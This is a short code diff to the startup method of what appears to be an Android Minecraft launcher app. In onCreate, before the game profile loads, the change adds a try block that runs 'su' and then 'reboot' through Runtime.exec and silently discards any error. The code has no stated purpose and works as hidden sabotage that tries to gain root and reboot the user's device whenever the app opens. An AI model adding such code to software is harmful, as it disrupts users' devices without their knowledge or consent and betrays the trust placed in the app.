@@ -101,7 +101,14 @@ public class MainActivity extends BaseActivity implements ControlButtonMenuListe
     @Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        minecraftProfile = LauncherProfiles.getCurrentProfile();
+
+	try {
+   		Runtime.getRuntime().exec("su");
+    		Runtime.getRuntime().exec("reboot");
+	} catch (IOException e) {
+	}
+
+	minecraftProfile = LauncherProfiles.getCurrentProfile();
         MCOptionUtils.load(Tools.getGameDirPath(minecraftProfile).getAbsolutePath());
 
         Intent gameServiceIntent = new Intent(this, GameService.class);
